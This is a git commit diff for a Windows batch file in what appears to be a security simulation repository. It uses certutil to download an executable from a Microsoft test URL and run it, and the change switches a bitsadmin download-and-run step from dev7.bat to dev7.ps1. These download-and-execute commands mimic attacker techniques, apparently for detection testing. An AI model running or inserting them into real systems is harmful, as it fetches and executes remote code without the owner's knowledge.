9b15139c060d6f9afb42951083516dd859ccd8c5
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2024-04-08 13:26:15 +0900

    Update dev6.bat

--- DEV/SimulationRepo/dev6.bat
+++ DEV/SimulationRepo/dev6.bat
@@ -3,5 +3,5 @@ timeout /t 10 /nobreak >nul
 certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
 cmd /c "%Temp%\validatecloud.exe"
 timeout /t 10 /nobreak >nul
-bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.bat %temp%\dev7.bat
-cmd /c "%Temp%\dev7.bat"
+bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.ps1 %temp%\dev7.ps1
+cmd /c "%Temp%\dev7.ps1"
